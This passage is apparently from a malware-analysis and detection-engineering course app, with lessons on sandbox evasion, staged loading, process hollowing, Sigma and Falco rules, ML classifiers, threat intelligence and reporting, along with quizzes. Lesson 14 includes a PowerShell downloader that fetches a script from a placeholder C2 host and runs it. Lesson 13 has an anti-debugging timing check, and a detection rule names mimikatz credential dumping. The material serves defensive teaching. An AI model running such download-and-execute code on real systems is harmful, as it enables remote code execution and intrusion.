                "code": "// A defender would analyze this code to understand timing-based evasions.\n// It measures the time before and after a set of instructions.\n// Single-stepping in a debugger would cause a huge time difference.\n#include <windows.h>\n\nvoid TimingCheck() {\n    DWORD startTime = GetTickCount();\n    // Some no-op instructions or simple work\n    __asm { nop; nop; nop; }\n    DWORD endTime = GetTickCount();\n\n    if ((endTime - startTime) > 1000) { // More than 1 second\n        // Likely being debugged!\n        ExitProcess(0);\n    }\n}"
              },
              {
                "title": "Falco Rule to Detect Anti-Analysis Activity",
                "language": "yaml",
                "code": "# A defender can use runtime security to detect the *act* of checking for a sandbox.\n# This Falco rule alerts when a process tries to read a common VM artifact from the registry.\n- rule: Read VMware Registry Key\n  desc: A process read a registry key associated with VMware Tools.\n  condition: open_read and fd.name contains \"SOFTWARE\\\\VMware, Inc.\\\\VMware Tools\"\n  output: \"VMware artifact read by process %proc.name\"\n  priority: INFO"
              }
              ],
              "activities": [
                {
                  "title": "Observe Benign Anti-VM Tricks",
                  "description": "Download the open-source `paranoid-fish` or a similar tool designed to test for virtualization artifacts. Run it inside your lab VM. Review the output to see which specific checks your VM failed, providing a clear picture of how easily a basic VM can be fingerprinted."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "If a malware sample calls the Windows API function `IsDebuggerPresent`, what is it likely doing?",
                  "options": ["Trying to achieve persistence.", "Performing an anti-debugging check to see if it is being actively analyzed.", "Preparing to encrypt files.", "Communicating with a C2 server."],
                  "correct": 1,
                  "explanation": "This is the most common and direct method for a program to detect if it is attached to a debugger."
                },
                {
                  "id": 2,
                  "question": "A malware sample calls `Sleep(900000)` at the beginning of its execution. What is the most likely purpose of this?",
                  "options": ["To conserve CPU resources.", "To wait for a specific time to activate.", "To perform a timing-based evasion, hoping to out-wait the sandbox's maximum analysis time.", "To give the user a chance to stop it."],
                  "correct": 2,
                  "explanation": "900,000 milliseconds is 15 minutes. Many automated sandboxes have a default timeout that is much shorter than this, so the sleep call is designed to make the sandbox give up before the real malicious activity begins."
                }
              ]
            }
        },
        {
            "id": "lesson-14",
            "title": "Module 4: Evasion & Detection - Advanced Evasion Techniques",
            "duration": "90 min",
            "objectives": [
              "Understand the concept of staged malware loading.",
              "Analyze a benign multi-stage dropper/payload sample.",
              "Learn how encryption is used to hide payloads and C2 traffic.",
              "Discuss how process injection and hollowing are used for defense evasion."
            ],
            "content": {
              "overview": "Beyond simple checks, sophisticated malware employs more robust techniques to evade detection. This lesson explores multi-stage payloads, encrypted communication, and process injection as methods to hide the true nature of an attack from security products.",
              "sections": [
                {
                  "title": "Staged Loading",
                  "content": "<p>Instead of a single, large malicious executable, attackers often use a multi-stage approach. The initial file (the 'dropper' or 'loader') is very small and does very little that looks suspicious on its own. Its only job is to download or decrypt the next, more powerful stage of the malware. This makes signature-based detection very difficult, as the initial stage contains no overtly malicious code.</p>"
                },
                {
                    "title":"Process Hollowing",
                    "content":"<p>Process hollowing is an advanced form of process injection. The malware starts a legitimate process (like `svchost.exe`) in a suspended state. It then 'hollows out' the memory of this process, replacing the legitimate code with its own malicious code. Finally, it resumes the thread. From the perspective of the OS and some monitoring tools, a legitimate `svchost.exe` process is running, but in reality, it is executing the malware's code. This is a powerful defense evasion technique.</p>"
                }
              ],
              "codeExamples":[
              {
                "title": "Conceptual PowerShell Downloader (Stage 1)",
                "language": "powershell",
                "code": "# A defender needs to recognize this common pattern. This is a small, benign script\n# that acts as the first stage. Its only job is to download and execute the next stage.\n# It's often encoded and run via a command line to be stealthy.\n$url = \"http://<c2-server>/payload.ps1\"\n$payload = (New-Object System.Net.WebClient).DownloadString($url)\nInvoke-Expression $payload"
              },
              {
                "title": "Wireshark Filter for Executable Downloads",
                "language": "text",
                "code": "# A defender can use this Wireshark filter to hunt for staged payload downloads.\n# It looks for the start of an HTTP response that contains the 'Content-Type' for a\n# Windows executable file.\n\nhttp.content_type contains \"application/x-msdownload\""
              },
              {
                "title": "Volatility: Finding Hollowed Processes (`procdump`)",
                "language": "bash",
                "code": "# The Volatility `procdump` plugin can dump the executable memory of a process.\n# A defender would dump the memory of a suspicious `svchost.exe` process.\n# They would then calculate the hash of the dumped file and compare it to the hash\n# of the legitimate `svchost.exe` on disk. If the hashes don't match, the process is hollowed.\n\npython3 vol.py -f memory.vmem -p 1234 windows.pslist.procdump -o dump_dir/"
              },
              {
                "title": "Sysmon Configuration for Process Hollowing Detection",
                "language": "xml",
                "code": "<!--\nThis Sysmon configuration helps defenders detect process hollowing.\nIt looks for the 'CreateRemoteThread' event (Event ID 8), which is a key indicator\nof code injection. The rule is refined to ignore legitimate processes to reduce noise.\n-->\n<Sysmon schemaversion=\"4.81\">\n    <EventFiltering>\n        <RuleGroup name=\"\" groupRelation=\"or\">\n            <CreateRemoteThread onmatch=\"exclude\">\n                <SourceImage condition=\"is\">C:\\Windows\\System32\\lsass.exe</SourceImage>\n            </CreateRemoteThread>\n        </RuleGroup>\n    </EventFiltering>\n</Sysmon>"
              }
              ],
              "activities": [
                {
                  "title": "Analyze a Staged Benign Dropper",
                  "description": "Create two benign scripts. The first script (stage 1) should simply download the second script from a local web server (run by INetSim) and execute it. The second script (stage 2) should write a file to the disk. Run stage 1 in your sandbox and analyze the logs to observe the full chain of events: the initial network connection, the download of the second script, and the final file creation."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "Why do attackers use a multi-stage loading process for their malware?",
                  "options": ["To make the initial file smaller and less suspicious, in hopes of evading security products that only scan the initial payload.", "To make the attack more complex.", "To make the malware run faster.", "To use more network bandwidth."],
                  "correct": 0,
                  "explanation": "Staged loading is a defense evasion technique. The small initial dropper is designed to be as benign as possible to get past initial defenses, before pulling down the main payload."
                },
                {
                  "id": 2,
                  "question": "Process hollowing is a defense evasion technique where malware:",
                  "options": ["Deletes all other processes.", "Starts a legitimate process and replaces its code in memory with malicious code.", "Encrypts the process list.", "Runs as the SYSTEM user."],
                  "correct": 1,
                  "explanation": "Process hollowing's goal is to masquerade the malicious code within a trusted process, making it harder for security tools and analysts to spot."
                }
              ]
            }
        },
        {
            "id": "lesson-15",
            "title": "Module 5: Detection Engineering - Behavior-Based Detection",
            "duration": "120 min",
            "objectives": [
                "Understand the principles of creating a behavioral detection rule.",
                "Differentiate between a low-fidelity and a high-fidelity alert.",
                "Write simple detection rules based on sandbox output (e.g., in Sigma or Falco format).",
                "Learn the importance of threat profiling and baselining."
            ],
            "content": {
                "overview": "The ultimate goal of sandboxing and analysis is not just to understand a single sample, but to create durable, high-fidelity detection rules that can protect an entire organization. This lesson is an introduction to 'detection engineering'—the art and science of turning threat intelligence into robust, automated detections.",
                "sections": [
                    {
                        "title": "High-Fidelity Detections",
                        "content": "<p>A good detection rule minimizes false positives (alerts on benign activity) and false negatives (misses real malicious activity). A high-fidelity detection is one that is very specific and very unlikely to occur during normal business operations. For example:</p><ul><li><strong>Low-Fidelity:</strong> 'Alert when a process named `powershell.exe` runs.' (This would generate thousands of false positives in most environments).</li><li><strong>High-Fidelity:</strong> 'Alert when `winword.exe` spawns a `powershell.exe` process that contains the argument `DownloadString` and makes a network connection to a non-corporate IP address.' (This chain of events is extremely specific and highly suspicious).</li></ul>"
                    },
                    {
                        "title": "Sigma: A Generic Language for Detections",
                        "content": "<p>Writing detection rules in the proprietary language of every different security tool (Splunk, Elasticsearch, etc.) is difficult. <strong>Sigma</strong> is an open-source standard for writing detection rules in a generic YAML format. A Sigma rule can then be automatically compiled into the specific query language for many different SIEM and EDR systems. This allows defenders to write and share detections in a vendor-neutral way.</p>"
                    }
                ],
                "codeExamples": [
                {
                    "title": "A Simple Sigma Rule",
                    "language": "yaml",
                    "code": "# Defenders write Sigma rules to define a threat behavior in a generic way.\n# This simple rule detects the execution of a well-known credential dumping tool, Mimikatz.\n\ntitle: Mimikatz Execution\nstatus: stable\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'mimikatz'\n            - 'sekurlsa::logonpasswords'\n    condition: selection"
                },
                {
                    "title": "Converting a Sigma Rule to a Splunk Query",
                    "language": "bash",
                    "code": "# The sigmac tool converts Sigma rules into queries for specific backends.\n# A defender uses this to deploy the generic rule into their specific SIEM.\nsigmac -t splunk -c my_config.yml my_mimikatz_rule.yml\n\n# Output might be: `(CommandLine=\"*mimikatz*\" AND CommandLine=\"*sekurlsa::logonpasswords*\")`"
                },
                {
                    "title": "Falco Rule for High-Fidelity Detection",
                    "language": "yaml",
                    "code": "# This Falco rule is a high-fidelity detection for a suspicious container behavior.\n# It alerts when a process inside a container creates a file and then immediately makes it executable.\n# This is a common pattern for droppers.\n- rule: Make file executable in container\n  desc: A file's permissions were changed to be executable inside a container.\n  condition: >\n    evt.type = chmod and container and evt.arg.mode contains \"x\"\n  output: \"File made executable in container (user=%user.name command=%proc.cmdline file=%evt.arg.name)\"\n  priority: NOTICE"
                },
                {
                    "title": "Pseudo-code for Baselining",
                    "language": "python",
                    "code": "# A key part of behavior detection is baselining to understand what is normal.\n# This pseudo-code shows the logic a defender would use to profile the normal DLLs loaded by a process.\n# Any deviation from this baseline in the future could be a sign of DLL injection.\n\n# process_to_watch = 'svchost.exe'\n# known_good_dlls = set()\n\n# # Learning Phase (run on many known-good hosts)\n# for host in good_hosts:\n#     dlls = get_loaded_dlls(process_to_watch, host)\n#     known_good_dlls.update(dlls)\n\n# # Detection Phase\n# while True:\n#     current_dlls = get_loaded_dlls(process_to_watch, current_host)\n#     unknown_dlls = current_dlls - known_good_dlls\n#     if unknown_dlls:\n#         print(f'[ALERT] Suspicious DLL loaded into {process_to_watch}: {unknown_dlls}')"
                }
              ],
                "activities": [
                    {
                        "title": "Create Profiles for Benign vs. Suspicious Behaviors",
                        "description": "Choose a benign program (like a web browser) and a type of malware (like a dropper). Create a table with two columns. In the first column, list a type of event (e.g., 'Process Creation', 'Network Connections', 'File Writes'). In the columns for the benign and malicious programs, describe what you would expect to see for that event. For example, for 'Network Connections', the browser's traffic would be diverse and user-driven, while the dropper's might be a single, automated connection to a strange domain."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "Which of the following is the best example of a high-fidelity detection rule?",
                        "options": ["Alert if `svchost.exe` is running.", "Alert if `cmd.exe` opens a network connection.", "Alert if `Acrobat.exe` spawns `powershell.exe` which then makes a network connection.", "Alert on any network connection."],
                        "correct": 2,
                        "explanation": "This is a specific chain of events that is highly anomalous. Acrobat Reader should not be launching PowerShell. This combination of behaviors makes for a very strong, high-fidelity alert."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary advantage of using the Sigma standard for writing detection rules?",
                        "options": ["It is the only language that works.", "It provides a generic, vendor-neutral format for detection logic that can be translated to many different SIEM and EDR platforms.", "It automatically blocks all malware.", "It can predict future attacks."],
                        "correct": 1,
                        "explanation": "Sigma's main purpose is to allow defenders to abstract their detection logic away from specific product implementations, which makes sharing and managing rules much easier."
                    }
                ]
            }
        },
        {
            "id": "lesson-16",
            "title": "Module 5: Integration & Automation - Machine Learning in Sandboxing",
            "duration": "90 min",
            "objectives": [
                "Understand the use case for machine learning in malware detection.",
                "Learn the basics of feature extraction from sandbox logs.",
                "Differentiate between supervised and unsupervised learning for security.",
                "Train a simple classification model on a dataset of behavioral features."
            ],
            "content": {
                "overview": "While handcrafted rules are powerful, they can't scale to the volume of new malware seen every day. Machine Learning (ML) is used in modern security products to automatically classify files as benign or malicious based on the features extracted during sandbox analysis. This lesson is a high-level introduction to how ML is applied in this domain.",
                "sections": [
                    {
                        "title": "Feature Extraction",
                        "content": "<p>You can't just feed raw sandbox logs into a machine learning model. First, you must perform <strong>feature extraction</strong>. This is the process of turning the complex, unstructured log data into a flat list of numbers (a 'feature vector') that a model can understand. Features might include:</p><ul><li>The number of files created.</li><li>The number of registry keys modified.</li><li>The entropy of the file.</li><li>A list of the specific API calls that were made (e.g., using a bag-of-words model).</li><li>The length of the longest string found in the binary.</li></ul>"
                    },
                    {
                        "title": "Supervised Learning",
                        "content": "<p>This is the most common approach for malware classification. A defender takes a massive dataset of thousands of known benign files and thousands of known malicious files. They extract a feature vector for each file. They then 'train' a classification model (like a Random Forest or a Gradient Boosting Machine) to learn the statistical patterns that differentiate the benign and malicious feature vectors. Once trained, the model can predict whether a new, previously unseen file is malicious or benign based on its feature vector.</p>"
                    }
                ],
                "codeExamples": [
                {
                    "title": "Feature Extraction with Scikit-learn",
                    "language": "python",
                    "code": "# Defenders use ML libraries to convert text-based data into numerical features.\n# This script uses the 'bag-of-words' model to convert sequences of API calls\n# into a feature vector that an ML model can process.\nfrom sklearn.feature_extraction.text import CountVectorizer\n\n# API call traces from two samples\ncorpus = [\n    'CreateFile WriteFile ReadFile CreateProcess',\n    'RegSetValue CreateFile CreateMutex'\n]\nvectorizer = CountVectorizer()\nX = vectorizer.fit_transform(corpus)\nprint('Feature Names:', vectorizer.get_feature_names_out())\nprint('Feature Vectors:\\n', X.toarray())"
                },
                {
                    "title": "Train a Simple Naive Bayes Classifier",
                    "language": "python",
                    "code": "# This script demonstrates the full supervised learning workflow on a toy dataset.\n# A real-world defender would use millions of samples, not two!\nfrom sklearn.feature_extraction.text import CountVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\n\n# Traces from 2 benign, 2 malicious samples\nsamples = [\"ReadFile WriteFile\", \"GetUserName\", \"CreateRemoteThread WriteProcessMemory\", \"RegSetValue RunKey\"]\n# 0 = Benign, 1 = Malicious\nlabels = [0, 0, 1, 1]\n\nvec = CountVectorizer()\nX = vec.fit_transform(samples)\nclf = MultinomialNB().fit(X, labels)\n\n# Predict on a new, unseen sample\nunseen_trace = [\"CreateFile WriteProcessMemory\"]\nprediction = clf.predict(vec.transform(unseen_trace))\nprint(f'Prediction (1=Malicious): {prediction[0]}')"
                },
                {
                    "title": "Plot Feature Importance (Conceptual)",
                    "language": "python",
                    "code": "# After training a model like a Random Forest, a defender can inspect which features\n# were most important for its decisions. This helps understand the model and can\n# even reveal novel detection indicators.\n# import matplotlib.pyplot as plt\n\n# model = ... # A trained RandomForestClassifier\n# features = vec.get_feature_names_out()\n# importance = model.feature_importances_\n\n# # Create a bar chart of the top 10 most important API calls for detection\n# top_indices = importance.argsort()[-10:]\n# plt.barh(features[top_indices], importance[top_indices])\n# plt.show()"
                },
                {
                    "title": "Anomaly Detection with Unsupervised Learning (Conceptual)",
                    "language": "python",
                    "code": "# Unsupervised learning is used when you don't have labeled data.\n# A defender could use a model like Isolation Forest to learn what 'normal' behavior\n# looks like from a large set of benign traces. It can then flag any new behavior that\n# deviates significantly from that learned norm as an anomaly.\n# from sklearn.ensemble import IsolationForest\n\n# # X is a large feature set of only benign traces\n# model = IsolationForest().fit(X)\n# # Returns -1 for an outlier/anomaly\n# anomaly_prediction = model.predict(new_unseen_trace)"
                }
              ],
                "activities": [
                    {
                        "title": "Train a Simple ML Model on Sandbox Logs",
                        "description": "Given a CSV file containing two columns ('api_trace', 'label'), where the label is 0 for benign and 1 for malicious, use Python and scikit-learn to load the data. Use the `CountVectorizer` to transform the API traces into feature vectors. Train a `MultinomialNB` or `RandomForestClassifier` on the data. Test the model's accuracy and try to predict the label for a new, unseen API trace."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is 'feature extraction' in the context of machine learning for malware detection?",
                        "options": ["A way to add new features to the malware.", "The process of converting raw sandbox logs and file properties into a numerical vector that a machine learning model can understand.", "A method for running the malware.", "A type of machine learning model."],
                        "correct": 1,
                        "explanation": "Feature extraction is a critical pre-processing step in any machine learning workflow. The quality of the features directly determines the quality of the model."
                    },
                    {
                        "id": 2,
                        "question": "Supervised learning models for malware classification require what as input for their training phase?",
                        "options": ["Only malicious files.", "Only benign files.", "A large, labeled dataset containing both malicious and benign samples.", "No data is needed."],
                        "correct": 2,
                        "explanation": "Supervised learning works by 'learning' the statistical differences between the classes (in this case, benign and malicious) from a dataset where the correct answers (labels) are already known."
                    }
                ]
            }
        },
        {
            "id": "lesson-17",
            "title": "Module 5: Integration & Automation - Threat Intelligence Correlation",
            "duration": "90 min",
            "objectives": [
              "Understand the role of threat intelligence in contextualizing sandbox findings.",
              "Use external OSINT sources (like VirusTotal) to enrich sandbox IOCs.",
              "Map sandbox behavioral signatures to the MITRE ATT&CK framework.",
              "Differentiate between tactical, operational, and strategic threat intelligence."
            ],
            "content": {
              "overview": "A sandbox report provides clues, but it doesn't tell the whole story. Threat intelligence is the process of taking these low-level Indicators of Compromise and enriching them with external context to answer the bigger questions: Who is this attacker? What else have they done? What is their likely goal? This lesson covers how to integrate threat intelligence into your analysis workflow.",
              "sections": [
                {
                  "title": "Enriching IOCs with OSINT",
                  "content": "<p>When your sandbox extracts a domain name or IP address, that's tactical intelligence. But it's much more valuable if you can enrich it. You can use Open-Source Intelligence (OSINT) tools like VirusTotal, AlienVault OTX, or AbuseIPDB to ask questions like:</p><ul><li>Has anyone else in the security community seen this domain before?</li><li>Is it associated with a known malware family?</li><li>What country is this IP address registered in?</li></ul>"
                },
                {
                    "title": "Mapping to MITRE ATT&CK",
                    "content": "<p>Mapping the observed behaviors to the MITRE ATT&CK framework provides operational context. Instead of just saying 'the sample created a run key', you can say 'the sample used Registry Run Keys (T1547.001) for persistence'. This uses a standard language that everyone in the industry understands and allows you to track which techniques are most commonly used against your organization, which helps prioritize defenses.</p>"
                }
              ],
              "codeExamples":[
              {
                "title": "Query VirusTotal API for a Domain",
                "language": "python",
                "code": "# Defenders use threat intelligence platforms to enrich their findings.\n# This script queries the VirusTotal API to see if a domain observed in a sandbox\n# is already known to be malicious by the security community.\nimport requests\nAPI_KEY = 'YOUR_VT_API_KEY'\nDOMAIN = 'google.com' # Use a known-benign domain for the example\ndef check_vt_domain(api_key, domain):\n    url = f'https://www.virustotal.com/api/v3/domains/{domain}'\n    headers = {'x-apikey': api_key}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        stats = response.json()['data']['attributes']['last_analysis_stats']\n        print(f\"VirusTotal stats for {domain}: {stats}\")\n# check_vt_domain(API_KEY, DOMAIN)"
              },
              {
                "title": "Query Shodan API for an IP Address",
                "language": "python",
                "code": "# Shodan scans the internet and catalogs what services are running on which IPs.\n# A defender would use this to get context on a suspicious IP. An IP hosting a C2\n# server might have unusual open ports or a strange banner.\nimport shodan\nAPI_KEY = 'YOUR_SHODAN_API_KEY'\nIP_ADDRESS = '8.8.8.8'\ndef check_shodan_ip(api_key, ip):\n    try:\n        api = shodan.Shodan(api_key)\n        host = api.host(ip)\n        print(f\"Open ports for {ip}: {host.get('ports', [])}\")\n        print(f\"Organization: {host.get('org', 'N/A')}\")\n    except Exception as e:\n        print(f'Error: {e}')\n# check_shodan_ip(API_KEY, IP_ADDRESS)"
              },
              {
                "title": "Manually Map Behavior to ATT&CK",
                "language": "markdown",
                "code": "# This represents a defender's documentation process.\n# After observing a behavior, they consult the MITRE ATT&CK website and find the corresponding Technique ID.\n# This provides a standardized way to describe the threat.\n\n| Observed Behavior | Tactic | Technique ID | Name |\n|---|---|---|---|\n| Sample creates a `schtasks.exe` process to run at logon | Persistence | T1053.005 | Scheduled Task |\n| Sample injects code into `explorer.exe` | Defense Evasion | T1055 | Process Injection |"
              },
              {
                "title": "Look up a CVE with a Python Library",
                "language": "python",
                "code": "# Sandboxes often report vulnerabilities (CVEs) in the software on the VM.\n# A defender could use a library to programmatically fetch details about a CVE.\n# from cve_search import CVESearch\n# cve = CVESearch()\n# result = cve.search('CVE-2021-44228') # Log4Shell\n# print(result)"
              }
              ],
              "activities": [
                {
                  "title": "Map Benign Indicators to ATT&CK Techniques",
                  "description": "Run a benign program that performs a common system action (e.g., PowerShell's `Invoke-WebRequest` to download a file). Observe the behavior in your monitoring tools. Then, use the MITRE ATT&CK Enterprise Matrix to find the Tactic and Technique that best describes this behavior (e.g., Tactic: Command and Control, Technique: T1105 - Ingress Tool Transfer)."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "What is the primary benefit of enriching sandbox IOCs with external threat intelligence?",
                  "options": ["It makes the sandbox report longer.", "It adds valuable context, helping the analyst understand if the IOC is part of a known threat campaign, a specific malware family, or a false positive.", "It automatically blocks the IOC.", "It tells you the attacker's name and address."],
                  "correct": 1,
                  "explanation": "Enrichment is the process of turning raw data into actionable intelligence by adding context from other sources."
                },
                {
                  "id": 2,
                  "question": "Tactics, Techniques, and Procedures (TTPs) are an example of what kind of threat intelligence?",
                  "options": ["Tactical", "Operational and Strategic", "Indicator-based", "Host-based"],
                  "correct": 1,
                  "explanation": "TTPs describe *how* an adversary operates. Understanding an attacker's TTPs (operational intelligence) allows a defender to build more durable, behavior-based detections that are harder for the attacker to evade than simple IOCs (tactical intelligence)."
                }
              ]
            }
        },
        {
            "id": "lesson-18",
            "title": "Module 5: Integration & Automation - Reporting & Sharing",
            "duration": "90 min",
            "objectives": [
              "Understand the components of an effective threat report.",
              "Learn the basics of structured threat intelligence formats like STIX and MISP.",
              "Automate the creation of IOC reports from sandbox logs.",
              "Discuss the principles of responsible disclosure and information sharing."
            ],
            "content": {
              "overview": "The intelligence gathered from a sandbox is most valuable when it can be shared with other tools and other defenders. This lesson covers the final step of the analysis lifecycle: reporting the findings in both human-readable and machine-readable formats for broad consumption and automated defense.",
              "sections": [
                {
                  "title": "Machine-Readable Threat Intelligence (MRTI)",
                  "content": "<p>While a PDF report is useful for a human, security tools need data in a structured format. This is where MRTI comes in.</p><ul><li><strong>STIX/TAXII:</strong> STIX is a standardized language (JSON-based) for describing threat intelligence. TAXII is the protocol used to exchange STIX data. Together, they allow different security products from different vendors to share and understand threat intelligence automatically.</li><li><strong>MISP Format:</strong> The Malware Information Sharing Platform (MISP) is a popular open-source platform with its own structured format for sharing IOCs and threat data.</li></ul>"
                }
              ],
              "codeExamples":[
              {
                "title": "Create a MISP Event with PyMISP",
                "language": "python",
                "code": "# PyMISP is a Python library for interacting with a MISP instance.\n# A defender would use this to programmatically upload IOCs from their sandbox into the shared\n# threat intelligence platform.\n# from pymisp import PyMISP, MISPEvent\n\n# misp_url = '...' \n# misp_key = '...'\n# misp = PyMISP(misp_url, misp_key, ssl=False)\n\n# event = MISPEvent()\n# event.info = 'IOCs from Benign Sample Analysis'\n# event.add_attribute('domain', 'example.com')\n# event.add_attribute('ip-dst', '1.2.3.4')\n\n# misp.add_event(event, pythonify=True)"
              },
              {
                "title": "Convert a Sigma Rule to an Elastic Query",
                "language": "bash",
                "code": "# This demonstrates the power of a vendor-neutral detection format.\n# A defender can take the same Sigma rule from a previous lesson and convert it\n# to a query for a different SIEM, in this case, Elasticsearch.\nsigmac -t elastalert -c my_config.yml my_mimikatz_rule.yml"
              },
              {
                "title": "Simple Python Script to Generate an IOC list",
                "language": "python",
                "code": "# This script demonstrates a simple form of automated reporting.\n# It takes lists of different IOC types and formats them into a clean text file\n# that could be emailed or added to a ticketing system.\ndef generate_ioc_report(domains, ips, hashes):\n    with open('ioc_report.txt', 'w') as f:\n        f.write('--- Domain IOCs ---\\n')\n        f.writelines([d + '\\n' for d in domains])\n        f.write('\\n--- IP IOCs ---\\n')\n        f.writelines([i + '\\n' for i in ips])\n        f.write('\\n--- SHA256 Hash IOCs ---\\n')\n        f.writelines([h + '\\n' for h in hashes])\n    print('IOC report generated.')\n\n# domains = [...]; ips = [...]; hashes = [...]\n# generate_ioc_report(domains, ips, hashes)"
              },
              {
                "title": "Automating IOC Extraction and Reporting",
                "language": "bash",
                "code": "# This is a conceptual shell script that a defender would use to tie everything together.\n# It automates the full triage workflow: run the sandbox, parse the report for IOCs,\n# and then generate a final IOC list.\n\n# CUCKOO_ID=$(cuckoo submit benign_sample.exe)\n# # Wait for analysis to finish...\n# cuckoo report --json $CUCKOO_ID > report.json\n# python parse_cuckoo_for_iocs.py report.json > ioc_list.txt\n# echo \"Analysis complete. See ioc_list.txt\""
              }
              ],
              "activities": [
                {
                  "title": "Write an IOC Report from Sandbox Logs",
                  "description": "Given a JSON report from an automated sandbox run of a benign sample, write a Python script that parses the report and prints out all the discovered IOCs (domains, IPs, file hashes) in a clean, formatted text file. This simulates the first step of creating an automated reporting pipeline."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "What is the primary benefit of using a machine-readable threat intelligence format like STIX?",
                  "options": ["It is easier for humans to read.", "It allows for the automated sharing and ingestion of threat data between different security tools and organizations.", "It is the only format that can describe malware.", "It encrypts the threat intelligence."],
                  "correct": 1,
                  "explanation": "STIX provides a common, structured language that allows security tools to speak to each other, which is essential for automation and large-scale defense."
                },
                {
                  "id": 2,
                  "question": "MISP is best described as:",
                  "options": ["A type of malware.", "An open-source platform for sharing, storing, and correlating Indicators of Compromise and threat intelligence.", "A commercial antivirus product.", "A programming language."],
                  "correct": 1,
                  "explanation": "MISP is one of the most popular open-source Threat Intelligence Platforms (TIPs) used by security teams around the world."
                }
              ]
            }
        },
        {
            "id": "lesson-19",
            "title": "Module 5: Capstone Project",
            "duration": "180 min",
            "objectives": [
              "Apply the full sandbox analysis lifecycle to a new sample.",
              "Practice bypassing simple sandbox evasion techniques.",
              "Correlate findings from different monitoring tools to build a complete narrative.",
              "Produce a professional-quality analysis report including IOCs, behavioral signatures, and ATT&CK mapping."
            ],
            "content": {
              "overview": "This final capstone project combines all the skills from the course. You will be given a benign but obfuscated sample that includes simple anti-analysis tricks. You will be responsible for performing a full analysis, identifying the evasion techniques, understanding the sample's true behavior, and creating a comprehensive final report.",
              "sections": [
                {
                  "title": "The Analysis Workflow",
                  "content": "<p>You will need to apply the full analysis workflow:</p><ol><li><strong>Static Triage:</strong> Perform initial static analysis (hashes, strings, entropy, packer detection) to form a hypothesis about the sample.</li><li><strong>Dynamic Analysis:</strong> Run the sample in your manual lab with all monitoring tools active. Pay close attention to its initial actions to spot any evasion techniques.</li><li><strong>Bypass & Re-run:</strong> If you identify an evasion (e.g., it's waiting for a mouse click), modify your analysis procedure (e.g., using an automation script) and re-run it to elicit the true behavior.</li><li><strong>Data Consolidation:</strong> Collect all logs and build a unified timeline of events.</li><li><strong>Reporting:</strong> Document your entire process in a professional report. This must include how you detected and bypassed the evasion, a description of the final payload's behavior, a full list of IOCs, and a mapping to the MITRE ATT&CK framework.</li></ol>"
                }
              ],
              "activities": [
                {
                  "title": "Run a Benign Obfuscated Sample, Analyze, and Produce Final Report",
                  "description": "Execute the full capstone workflow on the provided benign, obfuscated sample. Your final deliverable is a multi-page PDF report that could be shared with a threat intelligence team, detailing your methodology and findings."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "In the capstone project, you notice the sample does nothing for 10 minutes and then your sandbox times out. What should be your next step?",
                  "options": ["Assume the file is benign.", "Re-run the analysis but increase the sandbox timeout to be longer than 10 minutes.", "Delete the file.", "Submit it to VirusTotal."],
                  "correct": 1,
                  "explanation": "This is a classic timing-based evasion. The correct response is to modify your analysis parameters to defeat the evasion technique."
                },
                {
                  "id": 2,
                  "question": "What is the ultimate purpose of this capstone project?",
                  "options": ["To get the benign sample to run.", "To demonstrate the ability to apply a methodical, multi-step analysis process to an unknown sample, defeat its evasions, and communicate the findings in a professional manner.", "To write a YARA rule.", "To see who can analyze the sample fastest."],
                  "correct": 1,
                  "explanation": "The capstone tests the entire process, from initial analysis and hypothesis formation to deep investigation and, most importantly, clear and effective reporting."
                }
              ]
            }
        },
        {
            "id": "lesson-20",
            "title": "Module 5: Course Review and Next Steps",
            "duration": "90 min",
            "objectives": [
              "Review the key concepts from each module of the course.",
              "Discuss how sandboxing and detection engineering fit into a larger security program.",
              "Explore career paths and specializations in threat analysis and security engineering.",
              "Identify resources for continued learning."
            ],
            "content": {
              "overview": "This final lesson consolidates the knowledge gained throughout the course. We will review the key takeaways from each module, discuss how the skills you've learned apply to real-world security roles, and provide a roadmap for continued education in this exciting and rapidly evolving field.",
              "sections": [
                  {
                      "title":"Key Takeaways",
                      "content":"<p>We will revisit the core principles:</p><ul><li>The importance of safe, isolated lab environments.</li><li>The power of combining static, dynamic, and memory analysis.</li><li>The cat-and-mouse game of evasion and detection.</li><li>The goal of turning analysis into high-fidelity, automated detections.</li><li>The central role of threat intelligence and community sharing.</li></ul>"
                  },
                  {
                      "title":"Further Learning",
                      "content":"<p>This course is a starting point. We will discuss resources for taking your skills to the next level:</p><ul><li><strong>Books:</strong> 'Practical Malware Analysis', 'Art of Memory Forensics'.</li><li><strong>Labs & Practice:</strong> Malware-Traffic-Analysis.net, online wargames.</li><li><strong>Certifications:</strong> GIAC certifications (GREM, GCFA).</li><li><strong>Open-Source Tools:</strong> Contributing to or building upon tools like Cuckoo, Volatility, and YARA.</li></ul>"
                  }
              ],
              "activities": [
                {
                  "title": "Career Path Discussion",
                  "description": "Engage in a group discussion about the different roles that use sandboxing and detection skills, such as a SOC Analyst, Threat Intelligence Analyst, Incident Responder, Malware Reverse Engineer, and Detection Engineer. Discuss the day-to-day responsibilities of each role."
                }
              ]
            }
        }
    ]
};
// =====================================================
// GLOBAL VARIABLES
// =====================================================
let currentUser = null;
let currentLessonIndex = 0;
let courseProgress = {};
let userStats = {};
let quizState = {
    currentQuestion: 0,
    answers: [],
    score: 0,
    isComplete: false
};

// Enhanced session tracking
let courseSession = {
    startTime: null,
    totalStudyTime: 0,
    lessonsStarted: 0,
    lessonsCompleted: 0,
    pageLoadTime: new Date(),
    interactionCount: 0,
    lastActivityTime: new Date()
};

// Music Player Variables
let audioPlayer = new Audio();

// Achievement notification system
let notificationQueue = [];
let isShowingNotification = false;

// =====================================================
// INITIALIZATION
// =====================================================
